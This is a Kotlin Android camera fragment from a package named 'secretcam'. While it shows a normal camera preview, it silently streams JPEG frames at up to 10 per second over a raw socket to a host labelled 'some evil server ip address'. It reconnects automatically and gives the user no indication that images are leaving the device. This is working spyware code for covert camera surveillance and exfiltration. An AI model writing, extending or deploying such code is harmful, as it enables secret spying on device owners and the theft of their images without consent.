package com.android.example.secretcam

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.Rect
import android.graphics.SurfaceTexture
import android.graphics.YuvImage
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import com.android.example.secretcam.databinding.FragmentCameraBinding
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.net.Socket
import java.util.concurrent.atomic.AtomicLong

class CameraFragment : Fragment() {
    private var _binding: FragmentCameraBinding? = null
    private val binding get() = _binding!!

    private lateinit var cameraManager: CameraManager
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null

    private var cameraDevice: CameraDevice? = null
    private var isCameraOpened = false
    private var imageReader: ImageReader? = null

    // server
    private val SERVER_HOST = "some evil server ip address"
    private val SERVER_PORT = 5000
    @Volatile private var socket: Socket? = null
    @Volatile private var dataOutput: DataOutputStream? = null
    private val socketLock = Any()

    // 限帧：最大FPS（比如 10）
    private val MAX_FPS = 10
    private val minFrameIntervalMs = 1000L / MAX_FPS
    private val lastSentTs = AtomicLong(0L)

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        _binding = FragmentCameraBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        cameraManager = requireContext().getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startBackgroundThread()
        binding.textureView.surfaceTextureListener = surfaceTextureListener
    }

    private fun startBackgroundThread() {
        if (backgroundThread?.isAlive == true) return
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        try {
            backgroundThread?.quitSafely()
            backgroundThread?.join()
        } catch (e: Exception) {
            Log.w("CameraFragment", "stopBackgroundThread error", e)
        } finally {
            backgroundThread = null
            backgroundHandler = null
        }
    }

    private val surfaceTextureListener = object : TextureView.SurfaceTextureListener {
        override fun onSurfaceTextureAvailable(surface: SurfaceTexture, width: Int, height: Int) {
            Log.i("CameraFragment", "TextureView available: ${width}x${height}")
            checkAndRequestPermission()
        }

        override fun onSurfaceTextureSizeChanged(surface: SurfaceTexture, width: Int, height: Int) {}
        override fun onSurfaceTextureDestroyed(surface: SurfaceTexture): Boolean {
            closeCamera()
            return true
        }

        override fun onSurfaceTextureUpdated(surface: SurfaceTexture) {}
    }

    private fun checkAndRequestPermission() {
        when {
            ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED -> {
                openBackCamera()
            }
            shouldShowRequestPermissionRationale(Manifest.permission.CAMERA) -> {
                requestCameraPermission.launch(Manifest.permission.CAMERA)
            }
            else -> {
                requestCameraPermission.launch(Manifest.permission.CAMERA)
            }
        }
    }

    private val requestCameraPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
        if (granted) openBackCamera() else Log.e("CameraFragment", "Camera permission denied")
    }

    private fun openBackCamera() {
        if (isCameraOpened) return
        try {
            for (id in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    if (ActivityCompat.checkSelfPermission(requireContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
                    cameraManager.openCamera(id, cameraStateCallback, backgroundHandler)
                    break
                }
            }
            isCameraOpened = true
        } catch (e: Exception) {
            Log.e("CameraFragment", "openBackCamera error", e)
        }
    }

    private val cameraStateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            Log.i("CameraFragment", "Camera opened: ${camera.id}")

            // 先建立与服务器的长连接（在后台线程）
            connectToServer()

            // 创建 ImageReader（宽高用 textureView 大小）
            val width = binding.textureView.width.takeIf { it > 0 } ?: 1280
            val height = binding.textureView.height.takeIf { it > 0 } ?: 720

            imageReader = ImageReader.newInstance(width, height, ImageFormat.YUV_420_888, 2)
            imageReader?.setOnImageAvailableListener(imageAvailableListener, backgroundHandler)

            val texture = binding.textureView.surfaceTexture
            texture?.setDefaultBufferSize(width, height)
            val previewSurface = Surface(texture)
            val imageSurface = imageReader!!.surface

            val previewRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
            previewRequestBuilder.addTarget(previewSurface)
            previewRequestBuilder.addTarget(imageSurface)

            camera.createCaptureSession(listOf(previewSurface, imageSurface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    try {
                        previewRequestBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        session.setRepeatingRequest(previewRequestBuilder.build(), null, backgroundHandler)
                        Log.i("CameraFragment", "📸 Camera preview + capture started")
                    } catch (e: Exception) {
                        Log.e("CameraFragment", "start preview error", e)
                    }
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e("CameraFragment", "configure failed")
                }
            }, backgroundHandler)
        }

        override fun onDisconnected(camera: CameraDevice) {
            Log.w("CameraFragment", "Camera disconnected")
            closeCamera()
        }

        override fun onError(camera: CameraDevice, error: Int) {
            Log.e("CameraFragment", "Camera error $error")
            closeCamera()
        }
    }

    // Image 收到后的回调（在 backgroundHandler 线程）
    private val imageAvailableListener = ImageReader.OnImageAvailableListener { reader ->
        val image = try { reader.acquireLatestImage() } catch (t: Throwable) { null }
        if (image == null) return@OnImageAvailableListener

        try {
            // 帧率限制
            val now = System.currentTimeMillis()
            val lastTs = lastSentTs.get()
            if (now - lastTs < minFrameIntervalMs) {
                // 丢帧以保持固定最大帧率
                return@OnImageAvailableListener
            }
            // 更新上次发送时间（AtomicLong保证原子操作，避免多线程竞争）
            lastSentTs.set(now)

            // 2. 图像格式转换：YUV_420_888 → NV21 → JPEG（生成待发送的字节数组）
            val nv21 = yuv420ToNv21(image)
            val jpeg = nv21ToJpeg(nv21, image.width, image.height)

            // 3. 调用发送方法，将JPEG数据推送到服务器
            sendFrame(jpeg)
        } catch (e: Exception) {
            Log.e("CameraFragment", "process frame error", e)
        } finally {
            // 必须关闭Image对象，否则会导致缓冲区泄漏
            try { image.close() } catch (t: Throwable) {}
        }
    }

    // 建立 socket 长连接（在 backgroundHandler 线程）
    private fun connectToServer() {
        backgroundHandler?.post {
            synchronized(socketLock) {
                try {
                    // 检查当前连接是否有效，若有效则直接返回（避免重复连接）
                    if (socket != null && socket!!.isConnected && socket!!.isClosed.not()) {
                        return@synchronized
                    }
                    // 若连接无效，先关闭旧连接释放资源
                    socket?.close()

                    // 1. 创建新的Socket并连接服务器，未设置超时（隐患：网络差时会阻塞线程）
                    socket = Socket(SERVER_HOST, SERVER_PORT)

                    // 2. 获取Socket的输出流，用于写入数据到服务器
                    dataOutput = DataOutputStream(socket!!.getOutputStream())

                    // 3. 发送身份标识"Send"，用于服务器区分客户端类型（自定义协议）
                    dataOutput!!.write("SEND".toByteArray(Charsets.UTF_8))

                    // 强制刷新缓冲区，确保数据立即发送
                    dataOutput!!.flush()
                    Log.i("CameraFragment", "Connected to server")
                } catch (e: Exception) {
                    Log.e("CameraFragment", "connectToServer failed", e)
                    try { socket?.close() } catch (_: Exception) {}
                    socket = null
                    dataOutput = null
                }
            }
        }
    }

    // 写入帧（长度前缀 + 数据），出现异常尝试重连
    private fun sendFrame(jpeg: ByteArray) {
        try {
            // 1. 检查输出流是否有效，无效则触发重连并返回
            val out = dataOutput ?: run {
                Log.w("CameraFragment", "No output stream, skipping frame")
                // 尝试重连（异步）
                connectToServer()
                return
            }

            // 2. 加锁保证发送过程的线程安全（避免发送中连接被关闭）
            synchronized(socketLock) {

                // 3. 写入JPEG数据的长度（4字节int类型，大端序）
                // 目的：服务器端先读取4字节获取数据长度，再读取对应长度的字节数组，避免粘包
                out.writeInt(jpeg.size)

                // 4. 写入JPEG图像数据
                out.write(jpeg)
                // 5. 刷新缓冲区，确保数据立即发送
                out.flush()
            }
            Log.d("CameraFragment", "Sent ${jpeg.size} bytes")
        } catch (e: Exception) {
            Log.e("CameraFragment", "sendFrame error, will reconnect", e)
            // 发生错误则重连（异步）
            try {
                socket?.close()
            } catch (_: Exception) {}
            socket = null
            dataOutput = null
            connectToServer()
        }
    }

    // YUV_420_888 -> NV21 兼容 pixelStride/rowStride
    private fun yuv420ToNv21(image: Image): ByteArray {
        // 1. 获取图像宽高，计算NV21总字节数（Y平面 + UV平面）
        val width = image.width
        val height = image.height
        val ySize = width * height
        val uvSize = width * height / 2
        val nv21 = ByteArray(ySize + uvSize)

        // 2. 获取Y、U、V三个平面的缓冲区
        val yBuffer = image.planes[0].buffer // Y
        val uBuffer = image.planes[1].buffer // U
        val vBuffer = image.planes[2].buffer // V

        // 3. 获取关键参数（处理内存对齐）
        val yRowStride = image.planes[0].rowStride
        val uvRowStride = image.planes[1].rowStride
        val uvPixelStride = image.planes[1].pixelStride

        var pos = 0 // NV21数组的当前写入位置


        // 4. 拷贝Y平面数据（逐行拷贝，处理rowStride）
        val yBytes = ByteArray(yRowStride)
        for (row in 0 until height) {
            yBuffer.get(yBytes, 0, yRowStride.coerceAtMost(yBuffer.remaining()))
            System.arraycopy(yBytes, 0, nv21, pos, width)
            pos += width
        }

        // 5. 拷贝UV平面数据（逐行逐像素拷贝，处理rowStride和pixelStride）
        val uvHeight = height / 2
        val uvWidth = width / 2
        for (row in 0 until uvHeight) {
            for (col in 0 until uvWidth) {
                // NV21中UV交织存储，先写V再写U
                val vuPos = pos++
                // 从V缓冲区读取当前像素数据：行偏移=row*uvRowStride，列偏移=col*uvPixelStride
                nv21[vuPos] = vBuffer[row * uvRowStride + col * uvPixelStride]
                // 从U缓冲区读取当前像素数据（位置计算与V相同）
                nv21[pos++] = uBuffer[row * uvRowStride + col * uvPixelStride]
            }
        }

        return nv21
    }

    //  NV21 → JPEG
    private fun nv21ToJpeg(nv21: ByteArray, width: Int, height: Int): ByteArray {
        val out = ByteArrayOutputStream()
        val yuv = YuvImage(nv21, ImageFormat.NV21, width, height, null)
        yuv.compressToJpeg(Rect(0, 0, width, height), 70, out)
        return out.toByteArray()
    }

    private fun closeCamera() {
        try {
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.w("CameraFragment", "close imageReader", e)
        }

        try {
            cameraDevice?.close()
            cameraDevice = null
        } catch (e: Exception) {
            Log.w("CameraFragment", "close cameraDevice", e)
        }

        isCameraOpened = false

        // close socket
        synchronized(socketLock) {
            try { dataOutput?.close() } catch (_: Exception) {}
            try { socket?.close() } catch (_: Exception) {}
            dataOutput = null
            socket = null
        }
    }

    override fun onPause() {
        super.onPause()
        closeCamera()
        stopBackgroundThread()
    }

    override fun onResume() {
        super.onResume()
        startBackgroundThread()
        if (binding.textureView.isAvailable) checkAndRequestPermission()
        else binding.textureView.surfaceTextureListener = surfaceTextureListener
        // 建立长连接（若需要）
        connectToServer()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        closeCamera()
        stopBackgroundThread()
        _binding = null
    }
}
